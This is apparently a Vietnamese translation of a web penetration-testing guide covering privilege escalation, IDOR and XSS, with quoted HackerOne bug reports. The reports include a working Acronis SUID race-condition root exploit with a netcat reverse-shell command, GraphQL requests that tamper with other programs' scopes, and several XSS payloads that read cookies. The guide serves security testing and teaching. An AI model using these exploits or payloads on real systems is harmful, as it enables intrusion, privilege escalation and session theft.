Nếu thẻ bị bỏ qua, thì plugin sẽ chấp nhận bất kỳ phản hồi "authentication OK" nào mà không cần kiểm tra xem nó có đến từ một nguồn đáng tin cậy hay không.


#### 4.6.3 OTG-AUTHZ-003 (Testing for Privilege escalation)

##### Summary

Phần này mô tả vấn đề leo thang đặc quyền. Người kiểm tra phải xác minh rằng người dùng không thể sửa đổi các đặc quyền hoặc vai trò của mình bên trong ứng dụng.

Leo thang đặc quyền xảy ra khi người dùng có quyền truy cập vào nhiều tài nguyên hoặc chức năng hơn mức họ thường được phép và ứng dụng nên ngăn chặn việc nâng cấp hoặc thay đổi đó. Điều này thường được gây ra bởi một lỗ hổng trong ứng dụng. Kết quả là ứng dụng thực hiện các hành động có nhiều đặc quyền hơn so với dự định của nhà phát triển hoặc quản trị viên hệ thống.

Mức độ leo thang phụ thuộc vào những đặc quyền mà kẻ tấn công được phép sở hữu và những đặc quyền nào có thể đạt được khi khai thác thành công.

**How to test**

*Testing for role/privilege manipulation*

Trong mọi phần của ứng dụng mà người dùng có thể tạo thông tin trong cơ sở dữ liệu (ví dụ: thanh toán, thêm liên hệ hoặc gửi tin nhắn), có thể nhận thông tin (sao kê tài khoản, chi tiết đơn hàng, v.v.) hoặc xóa thông tin (thả người dùng, tin nhắn, v.v.) thì cần ghi lại chức năng đó. Người kiểm tra nên thử truy cập các chức năng đó với tư cách là người dùng khác để xác minh xem có thể truy cập chức năng không được phép theo vai trò/đặc quyền của người dùng (nhưng có thể được phép với tư cách là người dùng khác).

*Manipulation of user group*

Ví dụ:
HTTP POST sau đây cho phép người dùng thuộc grp001 truy cập đơn hàng #0001:
```
POST /user/viewOrder.jsp HTTP/1.1
Host: www.example.com
...

groupID=grp001&orderID=0001
```
Xác minh xem người dùng không thuộc grp001 có thể sửa đổi giá trị của tham số 'groupID' và 'orderID' để có quyền truy cập vào dữ liệu đặc quyền đó hay không.

*Manipulation of user profile*

Ví dụ:
Response của máy chủ sau hiển thị một trường ẩn trong HTML được trả lại cho người dùng sau khi xác thực thành công.
```
HTTP/1.1 200 OK
Server: Netscape-Enterprise/6.0
Date: Wed, 1 Apr 2006 13:51:20 GMT
Set-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com 
Set-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com
Cache-Control: no-cache
Pragma: No-cache 
Content-length: 247
Content-Type: text/html
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Connection: close

<form  name="autoriz" method="POST" action = "visual.jsp"> 
<input type="hidden" name="profile" value="SysAdmin">
<body onload="document.forms.autoriz.submit()">
</td>
</tr>
```
Điều gì sẽ xảy ra nếu người kiểm tra sửa đổi giá trị của biến "profile" thành "SysAdmin"? Có thể trở thành quản trị viên?

*Manipulation of condition value*

Ví dụ:
Trong một môi trường nơi máy chủ gửi thông báo lỗi được chứa dưới dạng một giá trị trong một tham số cụ thể trong một bộ mã trả lời, như sau:
```
@0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`    
StateExecToolBar`0`0`0`FlagsToolBar`0
```
Máy chủ cung cấp một sự tin tưởng ngầm cho người dùng. Nó tin rằng người dùng sẽ trả lời với thông báo trên đóng phiên.

Trong điều kiện này, hãy xác minh rằng không thể leo thang đặc quyền bằng cách sửa đổi các giá trị tham số. Trong ví dụ cụ thể này, bằng cách sửa đổi giá trị `PVValid` từ '-1' thành '0' (không có điều kiện lỗi), có thể xác thực máy chủ là quản trị viên.

*Manipulation of IP Address*

Ví dụ:
Một số webistes sử dụng địa chỉ IP để giới hạn truy cập hoặc đếm số lần đăng nhập lỗi dựa trên địa chỉ IP.
```
X-Forwarded-For: 8.1.1.1
```
Trong trường hợp này, nếu trang web sử dụng giá trị 'X-forwarded-For' làm địa chỉ IP của client, thì người kiểm tra có thể thay đổi giá trị IP của tiêu đề HTTP 'X-forwarded-For' để giải quyết vấn đề nhận dạng nguồn IP.

*URL Traversal*

Ví dụ:
Hãy thử duyệt qua trang web và kiểm tra xem một số trang có thể bỏ qua kiểm tra ủy quyền hay không.
```
/../.././userInfo.html
```

*WhiteBox*

Ví dụ:
Nếu việc kiểm tra ủy quyền URL chỉ được thực hiện bằng cách so khớp một phần URL, thì có khả năng người kiểm tra hoặc tin tặc có thể giải quyết việc ủy ​​quyền bằng các kỹ thuật mã hóa URL.
```
startswith(), endswith(), contains(), indexOf()
```

*Weak SessionID*

ID phiên yếu có thuật toán có thể dễ bị tấn công vũ phu. Ví dụ: một trang web đang sử dụng MD5 (Mật khẩu + UserID) làm sessionID. Sau đó, người kiểm tra có thể đoán hoặc tạo sessionID cho những người dùng khác.

##### Example report

Link to report: https://hackerone.com/reports/1251464

**Summary**

Ứng dụng Acronis True Image có một "Acronis True Image" SUID binary khởi động một binary "console" khác trong cùng một thư mục.SUID binary thực hiện một số kiểm tra trên "console" trước khi chạy để đảm bảo binary chính xác đang được chạy. Bằng cách sử dụng một hardlink tới tệp SUID binary, chúng tôi có thể ép buộc nó thử và tải "console" trong một thư mục đã chọn mà chúng tôi có thể ghi vào. Từ thời điểm này, chúng tôi có thể khai thác rằng SUID binary không khóa "console" trong khi nó kiểm tra xem nó có hợp lệ hay không, chúng tôi thiết lập một môi trường nơi chúng tôi có thể thay thế console theo ý muốn và cố gắng giành chiến thắng race condition mà chúng tôi thay thế binary "console" khi nó được kiểm tra nhưng trước khi nó được chạy. Nếu chúng tôi giành chiến thắng, chúng tôi sẽ giành được quyền thực thi mã với quyền root từ tài khoản quản trị viên.

**Steps To Reproduce**

Đầu tiên chúng ta thực hiện lệnh shell để chạy
```
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```

bây giờ hãy tạo chương trình c sẽ chạy lệnh shell này, đặt tên cho nó là test.c
```
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```

biên dịch chương trình
```
gcc test.c 
```

chạy chương trình python sau
```
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```

kết nối với root shell
```
nc 127.0.0.1 8080
```


#### 4.6.4 OTG-AUTHZ-004 (Testing for Insecure Direct Object References)

##### Summary

Tham chiếu đối tượng trực tiếp không an toàn xảy ra khi một ứng dụng cung cấp quyền truy cập trực tiếp vào các đối tượng dựa trên đầu vào do người dùng cung cấp. Do lỗ hổng này, kẻ tấn công có thể bỏ qua ủy quyền và truy cập trực tiếp vào tài nguyên trong hệ thống, chẳng hạn như tệp hoặc bản ghi cơ sở dữ liệu.
Tham chiếu đối tượng trực tiếp không an toàn cho phép kẻ tấn công bỏ qua ủy quyền và truy cập tài nguyên trực tiếp bằng cách sửa đổi giá trị của tham số được sử dụng để trỏ trực tiếp đến đối tượng. Các tài nguyên như vậy có thể là các mục cơ sở dữ liệu thuộc về những người dùng khác, các tệp trong hệ thống, v.v. Điều này là do ứng dụng lấy đầu vào do người dùng cung cấp và sử dụng nó để truy xuất một đối tượng mà không thực hiện đủ kiểm tra ủy quyền.

**How to Test**

Để kiểm tra lỗ hổng này, trước tiên người kiểm tra cần vạch ra tất cả các vị trí trong ứng dụng nơi đầu vào của người dùng được sử dụng để tham chiếu trực tiếp các đối tượng. Ví dụ: các vị trí mà đầu vào của người dùng được sử dụng để truy cập hàng cơ sở dữ liệu, tệp, trang ứng dụng, v.v. Tiếp theo, người kiểm tra nên sửa đổi giá trị của tham số được sử dụng để tham chiếu các đối tượng và đánh giá xem có thể truy xuất các đối tượng thuộc về người dùng khác hay không hoặc bỏ qua ủy quyền.


Cách tốt nhất để kiểm tra các tham chiếu đối tượng trực tiếp là có ít nhất hai người dùng (thường là nhiều hơn) để bao gồm các đối tượng và chức năng thuộc sở hữu khác nhau. Ví dụ: hai người dùng, mỗi người có quyền truy cập vào các đối tượng khác nhau (chẳng hạn như thông tin mua hàng, tin nhắn riêng tư, v.v.) và (nếu có liên quan) người dùng có các đặc quyền khác nhau (ví dụ: người dùng quản trị viên) để xem liệu có tham chiếu trực tiếp đến chức năng của ứng dụng hay không. Bằng cách có nhiều người dùng, người thử nghiệm tiết kiệm thời gian thử nghiệm có giá trị trong việc đoán các tên đối tượng khác nhau vì anh ta có thể cố gắng truy cập các đối tượng thuộc về người dùng khác.

Dưới đây là một số tình huống điển hình cho lỗ hổng này và các phương pháp để kiểm tra từng tình huống:

1. The value of a parameter is used directly to retrieve a database record

    Sample request:
    ```
    http://foo.bar/showImage?img=img00011
    ```

    Trong trường hợp này, giá trị của tham số tệp được sử dụng để cho ứng dụng biết tệp mà người dùng định truy xuất. Bằng cách cung cấp tên hoặc mã định danh của một tệp khác (ví dụ: tệp=image00012.jpg), kẻ tấn công sẽ có thể truy xuất các đối tượng thuộc về những người dùng khác.

    Để kiểm tra trường hợp này, người kiểm tra phải lấy một tham chiếu mà người dùng không được phép truy cập và cố gắng truy cập nó bằng cách sử dụng nó làm giá trị của tham số tệp. Lưu ý: Lỗ hổng này thường được khai thác cùng với lỗ hổng  directory/path traversal
    
2. The value of a parameter is used directly to access application functionality

    Sample request:
    ```
    http://foo.bar/accessPage?menuitem=12
    ```

    Trong trường hợp này, giá trị của tham số menuitem được sử dụng để báo cho ứng dụng biết mục menu nào (và do đó chức năng ứng dụng nào) mà người dùng đang cố truy cập. Giả sử người dùng được cho là bị hạn chế và do đó chỉ có các liên kết để truy cập vào các mục menu 1, 2 và 3. Bằng cách sửa đổi giá trị của tham số menuitem, có thể bỏ qua ủy quyền và truy cập chức năng ứng dụng bổ sung. Để kiểm tra trường hợp này, người kiểm tra xác định vị trí nơi chức năng ứng dụng được xác định bằng cách tham chiếu đến một mục menu, ánh xạ giá trị của các mục menu mà người dùng kiểm tra đã cho có thể truy cập, sau đó thử các mục menu khác.


    Trong các ví dụ trên, chỉ cần sửa đổi một tham số là đủ. Tuy nhiên, đôi khi tham chiếu đối tượng có thể được phân chia giữa nhiều tham số và thử nghiệm phải được điều chỉnh cho phù hợp.

##### Example report

Link to report: https://hackerone.com/reports/1501611

**Summary:**

Xin chào, tôi đã phát hiện ra một lỗ hổng IDOR cho phép lưu trữ scope của bất kỳ chương trình nào. scope được sử dụng để cung cấp thông tin về scope hợp lệ của chương trình. Ví dụ: HackerOne có các scope sau:
https://hackerone.com
https://api.hackerone.com
...

**Steps To Reproduce:**

1. Obtain the structured_scope_id:

    Điều này có thể được tìm thấy bằng cách mã hóa base64: gid://hackerone/StructuredScope/NUMBER
    Ví dụ: nếu số đó là 94773 , thì structered_scope_id sẽ là Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==
    Hoặc, nó có thể được tìm thấy bằng cách chặn phản hồi của trang hồ sơ chương trình.

2. Send the Following Request:

    ```
    POST /graphql HTTP/2
    Host: hackerone.com
    Content-Length: 388
    Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
    Accept: */*
    X-Auth-Token: AUTHTOKEN
    Content-Type: application/json
    Origin: https://hackerone.com
    Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

    {"operationName":"ArchiveScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation ArchiveScope($structured_scope_id: ID!) {\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
    ```

    Cũng có thể hủy lưu trữ scope của các chương trình khác với yêu cầu sau.:
    ```
    POST /graphql HTTP/2
    Host: hackerone.com
    Content-Length: 414
    Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
    Accept: */*
    X-Auth-Token: ████
    Content-Type: application/json
    Origin: https://hackerone.com
    Referer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7

    {"operationName":"UnarchiveStructuredScope","variables":{"structured_scope_id":"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw=="},"query":"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\n    was_successful\n    structured_scope {\n      id\n      archived_at\n      __typename\n    }\n    __typename\n  }\n}\n"}
    ```

    Mặc dù phản hồi sẽ cho biết không có scope có cấu trúc nào tồn tại nhưng scope đó sẽ được lưu trữ.
    Thay thế Structure_scope_id bằng scope bạn muốn nhắm mục tiêu và X-Auth-Token bằng mã thông báo của bạn.
    Tôi sẽ sớm cung cấp Mp4 PoC.

**Impact**

Kẻ tấn công có thể lưu trữ hoặc hủy lưu trữ tất cả hơn 90000 phạm vi trên HackerOne.



### 4.8 OTG-INPVAL (Input Validation Testing)

#### 4.8.1 OTG-INPVAL-001 (Testing for Reflected Cross site scripting)

##### Summary

Reflected Cross-site Scripting (XSS) xảy ra khi kẻ tấn công đưa mã thực thi của trình duyệt vào trong một phản hồi HTTP duy nhất. Cuộc tấn công được đưa vào không được lưu trữ trong chính ứng dụng; nó không liên tục và chỉ ảnh hưởng đến những người dùng mở liên kết được tạo độc hại hoặc trang web của bên thứ ba. Chuỗi tấn công được đưa vào như một phần của tham số URI hoặc HTTP được tạo thủ công, được ứng dụng xử lý không đúng cách và được trả lại cho nạn nhân.

Reflected XSS là loại tấn công XSS thường xuyên nhất được tìm thấy trong thực tế. Các cuộc tấn công XSS được phản ánh còn được gọi là các cuộc tấn công XSS không liên tục và do tải trọng tấn công được phân phối và thực hiện thông qua một yêu cầu và phản hồi duy nhất nên chúng còn được gọi là XSS loại 1 hoặc loại 1.

Khi một ứng dụng web dễ bị tấn công bởi kiểu tấn công này, nó sẽ chuyển đầu vào chưa được xác thực được gửi qua các response tới client. Phương thức hoạt động phổ biến của cuộc tấn công bao gồm một bước thiết kế, trong đó kẻ tấn công tạo và kiểm tra một URI vi phạm, một bước kỹ thuật xã hội, trong đó kẻ tấn công thuyết phục nạn nhân của mình tải URI này trên trình duyệt của họ và cuối cùng là thực thi mã vi phạm trên trình duyệt của nạn nhân.

Thông thường, mã của kẻ tấn công được viết bằng ngôn ngữ Javascript, nhưng các ngôn ngữ kịch bản khác cũng được sử dụng, ví dụ: ActionScript và VBScript. Những kẻ tấn công thường tận dụng các lỗ hổng này để cài đặt trình ghi nhật ký khóa, đánh cắp cookie của nạn nhân, thực hiện hành vi trộm cắp khay nhớ tạm và thay đổi nội dung của trang (ví dụ: liên kết tải xuống).

Một trong những khó khăn chính trong việc ngăn chặn các lỗ hổng XSS là mã hóa ký tự phù hợp. Trong một số trường hợp, máy chủ web hoặc ứng dụng web không thể lọc một số mã hóa ký tự, vì vậy, chẳng hạn như ứng dụng web có thể lọc ra `"<script>"`, nhưng có thể không lọc `%3cscript%3e` chỉ bao gồm một mã hóa khác của các thẻ.

**How to Test**

*Black Box testing*

Một black-box test sẽ bao gồm ít nhấ 3 giai đoạn:

1. Phát hiện các vectơ đầu vào. Đối với mỗi trang web, người kiểm tra phải xác định tất cả các biến do người dùng xác định của ứng dụng web và cách nhập chúng. Điều này bao gồm các đầu vào ẩn hoặc không rõ ràng, chẳng hạn như tham số HTTP, dữ liệu POST, giá trị trường biểu mẫu ẩn và giá trị lựa chọn hoặc radio được xác định trước. Thông thường, trình chỉnh sửa HTML trong trình duyệt hoặc proxy web được sử dụng để xem các biến ẩn này. Xem ví dụ bên dưới.

2. Phân tích từng vector đầu vào để phát hiện các lỗ hổng tiềm ẩn. Để phát hiện lỗ hổng XSS, người kiểm tra thường sẽ sử dụng dữ liệu đầu vào được chế tạo đặc biệt với mỗi vectơ đầu vào.

```
<script>alert(123)</script>
```
```
"><script>alert(document.cookie)</script>
```

3. Đối với mỗi đầu vào thử nghiệm đã thử trong giai đoạn trước, người kiểm tra sẽ phân tích kết quả và xác định xem nó có phải là một lỗ hổng có tác động thực tế đến bảo mật của ứng dụng web hay không. Điều này yêu cầu kiểm tra HTML của trang web kết quả và tìm kiếm đầu vào thử nghiệm. Sau khi tìm thấy, trình kiểm tra sẽ xác định bất kỳ ký tự đặc biệt nào không được mã hóa, thay thế hoặc lọc ra đúng cách. Tập hợp các ký tự đặc biệt chưa được lọc dễ bị tấn công sẽ phụ thuộc vào ngữ cảnh của phần HTML đó.

Lý tưởng nhất là tất cả các ký tự đặc biệt HTML sẽ được thay thế bằng các HTML entities. Các HTML entities chính cần xác định là:

```
> (greater than) 
< (less than) 
& (ampersand)
' (apostrophe or single quote)
" (double quote)
```

*Gray Box testing*

Gray Box testing cũng tương tự như black box testing. Trong gray box testing, pen-tester có một phần kiến ​​thức về ứng dụng. Trong trường hợp này, thông tin liên quan đến đầu vào của người dùng, kiểm soát xác thực đầu vào và cách thức đầu vào của người dùng được trả lại cho người dùng có thể được pen-tester biết.

Nếu mã nguồn có sẵn (white box), tất cả các biến nhận được từ người dùng sẽ được phân tích. Ngoài ra, người thử nghiệm nên phân tích bất kỳ quy trình vệ sinh nào được triển khai để quyết định xem có thể tránh được những quy trình này hay không.

##### Example report

Link to report: https://hackerone.com/reports/130889

Tham số p trong `https://scores.ubnt.com/form.html?uid=1&p=airFiber` dễ bị XSS. Nếu người dùng đăng nhập tại `https://account.ubnt.com/login` và truy cập `https://scores.ubnt.com/form.html?uid=1&p=airFiber"><script>alert(document.cookie); </script>`, một hộp thông báo sẽ hiển thị với cookie của user. Đính kèm là POC:

![](/img/4-8/xss-scores-chrome.png)

Mã dễ bị tổn thương của `https://scores.ubnt.com/form.html` cũng được đính kèm:

![](/img/4-8/xss-vuln-code.png)

Trong đó có thể thấy rằng sản phẩm (tham số p) được đưa vào mà không có xác thực đầu vào phù hợp.
Lỗ hổng này có thể được sử dụng để đánh cắp cookie (dữ liệu phiên) từ người dùng được xác thực cũng như cho các cuộc tấn công lừa đảo. Nó có thể bị khai thác bằng cách gửi một liên kết độc hại tới người dùng hoặc đăng liên kết này lên một diễn đàn.
Khi UBNT triển khai SSO, điều này có thể rất nguy hiểm.

Để giảm thiểu lỗ hổng này, hãy xem xét những điều sau:
- Mã hóa đầu ra của tất cả các ký tự đặc biệt
- Xác thực đầu vào của dữ liệu được cung cấp từ người dùng


Link to report: https://hackerone.com/reports/158484

Xin chào,
Tôi muốn thông báo rằng report #130889 vẫn chưa được khắc phục hoàn toàn.
Chức năng removeTags đã được thêm vào, tuy nhiên kẻ tấn công vẫn có thể đưa Javascript làm giá trị tham số mà không cần bất kỳ thẻ HTML nào:
`https://scores.ubnt.com/form.html?uid=1&p=%27%20onmouseover=alert(document.domain)//`
Tập lệnh được kích hoạt bởi sự kiện onmouseover trên tiêu đề.

Đã thử nghiệm với Firefox và Chrome mới nhất.

![](img/4-8/ubnt_xss.png)

Hơn nữa, bạn không nên cho phép style injection nói chung:
`https://scores.ubnt.com/form.html?uid=1&p=)%3B%20background-color:%23000000%3B`
Chúng cũng có thể dẫn đến XSS trong một số trình duyệt, chẳng hạn như trong IE7 thông qua các biểu thức CSS.



Link to report: https://hackerone.com/reports/208622

Dear Ubiquiti Networks bug bounty team,

**Short Description**

Scores.ubnt.com vẫn dễ bị tấn công bởi reflected XSS, một hình thức chèn mã phía máy khách trong đó một người có thể thực thi các tập lệnh độc hại vào một trang. Bản sửa lỗi cho report https://hackerone.com/reports/158484 không đủ cho một số trình duyệt (chủ yếu là các phiên bản cũ hơn) vì có các vectơ XSS `attribute style`.

**Why does this vulnerability exist?**

XSS tồn tại bất cứ khi nào đầu vào có thể được hiểu là mã. Các tập lệnh có thể được đưa vào attribute style thông qua tham số p như sau:
`https://scores.ubnt.com/form.html?uid=259&p=airFiber);xss:expression(alert(1));border-image:url(foobar`
Dưới đây là danh sách các payload:

```
);xss:expression(alert(1));border-image:url(foobar
);border-image: url(javascript:alert(1));content:url(foobar
```

**What are the exploits?**

Lỗ hổng XSS cho phép kẻ tấn công sửa đổi trang. Điều này có nghĩa là attacker có thể chèn các biểu mẫu để đánh cắp tên người dùng, mật khẩu, cookie (không có cờ HttpOnly), v.v. Tóm lại, XSS mở ra cơ hội cho rất nhiều kỹ thuật lừa đảo.

#### 4.8.2 OTG-INPVAL-002 (Testing for Stored Cross site scripting)

##### Summary

Stored Cross-site Scripting (XSS) là loại Cross-site Scripting nguy hiểm nhất. Các ứng dụng web cho phép người dùng lưu trữ dữ liệu có khả năng bị tấn công kiểu này. Chương này minh họa các ví dụ về tiêm chéo trang được lưu trữ và các kịch bản khai thác liên quan.

Stored XSS xảy ra khi một ứng dụng web thu thập thông tin đầu vào từ người dùng có thể là độc hại, sau đó lưu trữ thông tin đầu vào đó trong kho lưu trữ dữ liệu để sử dụng sau này. Đầu vào được lưu trữ không được lọc chính xác. Do đó, dữ liệu độc hại sẽ xuất hiện như một phần của trang web và chạy trong trình duyệt của người dùng dưới các đặc quyền của ứng dụng web. Do lỗ hổng này thường liên quan đến ít nhất hai yêu cầu đối với ứng dụng nên đây cũng có thể được gọi là XSS cấp hai.

Lỗ hổng này có thể được sử dụng để tiến hành một số cuộc tấn công dựa trên trình duyệt bao gồm:

- Chiếm quyền trình duyệt của người dùng khác
- Nắm bắt thông tin nhạy cảm được xem bởi người dùng ứng dụng
- Deface giả của ứng dụng
- Quét cổng của máy chủ nội bộ ("nội bộ" liên quan đến người dùng ứng dụng web)
- Phân phối trực tiếp khai thác dựa trên trình duyệt
- Các hoạt động độc hại khác

Stored XSS không cần liên kết độc hại để khai thác. Khai thác thành công xảy ra khi người dùng truy cập trang có stored XSS. Các giai đoạn sau liên quan đến kịch bản tấn công Stored XSS điển hình:

- Kẻ tấn công lưu trữ mã độc hại vào trang dễ bị tấn công
- Người dùng xác thực trong ứng dụng
- Người dùng truy cập trang dễ bị tấn công
- Mã độc được thực thi bởi trình duyệt của người dùng

Kiểu tấn công này cũng có thể bị khai thác với các framework khai thác trình duyệt như BeEF, XSS Proxy và Backframe. Các framework này cho phép phát triển khai thác JavaScript phức tạp.

Stored XSS đặc biệt nguy hiểm trong các khu vực ứng dụng nơi người dùng có đặc quyền cao có quyền truy cập. Khi quản trị viên truy cập trang dễ bị tấn công, cuộc tấn công sẽ tự động được thực hiện bởi trình duyệt của họ. Điều này có thể làm lộ thông tin nhạy cảm, chẳng hạn như mã thông báo ủy quyền phiên.

**How to Test**

*Black Box testing*

Quy trình xác định các lỗ hổng Stored XSS tương tự như quy trình được mô tả trong quá trình kiểm tra Reflected XSS.

1. Input Forms

    Bước đầu tiên là xác định tất cả các điểm mà đầu vào của người dùng được lưu trữ vào back-end và sau đó được ứng dụng hiển thị. Có thể tìm thấy các ví dụ điển hình về đầu vào của người dùng được lưu trữ trong:

    - Trang User/Profiles: ứng dụng cho phép người dùng chỉnh sửa/thay đổi các chi tiết hồ sơ như họ, tên, biệt hiệu, ảnh đại diện, ảnh, địa chỉ, v.v.
    - Giỏ hàng: ứng dụng cho phép người dùng lưu trữ các mặt hàng vào giỏ hàng để sau này có thể xem lại
    - File Manager: ứng dụng cho phép upload file
    - Cài đặt/tùy chọn ứng dụng: ứng dụng cho phép người dùng đặt tùy chọn
    - Diễn đàn/Bảng tin: ứng dụng cho phép trao đổi bài viết giữa những người dùng
    - Blog: nếu ứng dụng blog cho phép người dùng gửi bình luận
    - Log: nếu ứng dụng lưu trữ một số người dùng nhập log.

2. Analyze HTML code

    Đầu vào được lưu trữ bởi ứng dụng thường được sử dụng trong các thẻ HTML, nhưng nó cũng có thể được tìm thấy như một phần của nội dung JavaScript. Ở giai đoạn này, điều cơ bản là phải hiểu liệu đầu vào có được lưu trữ hay không và cách nó được định vị trong ngữ cảnh của trang. Khác với Reflected XSS, pen-tester cũng nên điều tra mọi kênh ngoài băng thông qua đó ứng dụng nhận và lưu trữ đầu vào của người dùng.

    Lưu ý: Tất cả các khu vực của ứng dụng mà quản trị viên có thể truy cập phải được kiểm tra để xác định sự hiện diện của bất kỳ dữ liệu nào do người dùng gửi.

*Gray Box testing*

Gray Box testing cũng tương tự như black box testing. Trong gray box testing, pen-tester có một phần kiến ​​thức về ứng dụng. Trong trường hợp này, thông tin liên quan đến đầu vào của người dùng, kiểm soát xác thực đầu vào và lưu trữ dữ liệu có thể được pen-tester biết.

Tùy thuộc vào thông tin có sẵn, thông thường người thử nghiệm nên kiểm tra cách ứng dụng xử lý thông tin nhập của người dùng và sau đó lưu trữ vào hệ thống phụ trợ. Các bước sau đây được khuyến nghị:

- Sử dụng ứng dụng giao diện người dùng và nhập đầu vào với các ký tự đặc biệt/không hợp lệ
- Phân tích (các) phản hồi của ứng dụng
- Xác định sự hiện diện của các điều khiển xác thực đầu vào
- Truy cập hệ thống back-end và kiểm tra xem dữ liệu đầu vào có được lưu trữ hay không và lưu trữ như thế nào
- Phân tích mã nguồn và hiểu cách ứng dụng hiển thị đầu vào được lưu trữ

Nếu mã nguồn có sẵn (White box), tất cả các biến được sử dụng trong các biểu mẫu đầu vào sẽ được phân tích. Cụ thể, các ngôn ngữ lập trình như PHP, ASP và JSP sử dụng các biến/hàm được xác định trước để lưu trữ đầu vào từ các yêu cầu HTTP GET và POST.

Bảng sau đây tóm tắt một số biến và hàm đặc biệt cần xem xét khi phân tích mã nguồn:


|PHP	|ASP	|JSP|
|-------|-------|---|
|```$_GET - HTTP GET variables $_POST - HTTP POST variables $_REQUEST – http POST, GET and COOKIE variables $_FILES - HTTP File Upload variables```|```Request.QueryString - HTTP GET Request.Form - HTTP POST Server.CreateObject - used to upload files```|```doGet, doPost servlets - HTTP GET and POST request.getParameter - HTTP GET/POST variables```|

Lưu ý: Bảng trên chỉ là bản tóm tắt các tham số quan trọng nhất, nhưng tất cả các tham số đầu vào của người dùng cần được điều tra.


##### Example report

Link to report: https://hackerone.com/reports/485748

**Summary:**

Stored XSS có thể được gửi trên các reports và bất kỳ ai sẽ kiểm tra report XSS sẽ kích hoạt.

**Description:**

Stored XSS, còn được gọi là persistent XSS, là loại XSS gây hại nhiều hơn non-persistent. Nó xảy ra khi một tập lệnh độc hại được đưa trực tiếp vào một ứng dụng web dễ bị tấn công.

**Steps To Reproduce:**

1. Truy cập https://app.mopub.com/reports/custom/
2. Nhấp vào New network report.
3. Trên tên, nhập trọng tải: `"><img src=x onerror=alert(document.domain)>`
4. Nhấp vào Run and save sau đó XSS sẽ kích hoạt.

**Demonstration of the vulnerability:**

PoC: ![](img/4-8/xssed.gif)

Đã thử nghiệm trên Firefox và chrome.

**Impact:**

Kẻ tấn công có thể đánh cắp dữ liệu từ bất kỳ ai kiểm tra báo cáo.



Link to report: https://hackerone.com/reports/503298

**Note:**

Hello Twitter Team, tôi vừa nhận thấy rằng báo cáo #485748 của tôi đã được sửa, bạn có thể xác nhận không? nhưng các báo cáo trùng lặp khác của tôi thì không và vẫn tồn tại. #492444 #492913 bạn có chắc là do cùng một nguyên nhân không? bởi vì tôi nghĩ rằng bản sửa lỗi rộng rãi đã được phát hành nhưng không khắc phục được các sự cố khác.
Tôi sẽ làm một báo cáo ở đây để bạn sẽ chú ý. Tôi sẽ hợp nhất #492444 #492913 tại đây. Tôi cũng đang suy nghĩ cho Twitter Security. Tôi đang theo dõi MoPub vì báo cáo #485748 đã được đặt ở trạng thái phân loại.
Bản sửa lỗi chung không thực sự khắc phục được tất cả các sự cố, đó là lý do tại sao tôi gửi lại các sự cố này.

**Description:**

Một vấn đề có thể được thực hiện ngược lại. Thành viên đó có thể chiếm quyền điều khiển quản trị viên hoặc quản trị viên chiếm quyền điều khiển thành viên bằng cách đưa tập lệnh độc hại vào cài đặt tài khoản.

**Steps to reproduce:**

1. Đăng nhập vào MoPub: https://app.mopub.com/account/login/
2. Chuyển đến cài đặt tài khoản (hầu hết mọi thứ ở đây đều dễ bị XSS)
3. Inject on currency
4. Bạn cũng có thể inject on company's information (mọi đầu vào đều dễ bị XSS)

*Cases of injecting on company's name*

- Khi nạn nhân vào tab báo cáo, XSS sẽ kích hoạt. (ngay cả khi nạn nhân ở công ty ban đầu của họ, công ty của kẻ tấn công vẫn hiển thị trên menu thả xuống của email.)
- Khi nạn nhân vào cài đặt tài khoản, XSS sẽ kích hoạt.
- Khi nạn nhân chỉnh sửa cài đặt người dùng, XSS sẽ kích hoạt.

*Cases of injecting on currency(vice versa attack)*

- Quản trị viên có thể tiêm tải trọng độc hại bằng tiền tệ có thể chiếm quyền điều khiển phiên của thành viên. (Kích hoạt XSS ở cuối thành viên)
- Thành viên có thể tiêm tải trọng độc hại bằng tiền tệ có thể chiếm quyền điều khiển phiên của quản trị viên. (Kích hoạt XSS ở phía quản trị viên)

Tôi đã cung cấp Bản trình diễn đầy đủ về lỗ hổng

![](img/4-8/Full_PoC.gif)

**Based on Roles and Permissions (Vice Versa Attack):**

- Thành viên có thể thực hiện các thay đổi trong tài khoản nhưng họ không thể thêm người dùng mới, thay đổi vai trò của người dùng khác hoặc xem thông tin thanh toán.

![](img/4-8/pic.PNG)



#### 4.8.3 OTG-INPVAL-003 (Testing for HTTP Verb Tampering)

##### Summary

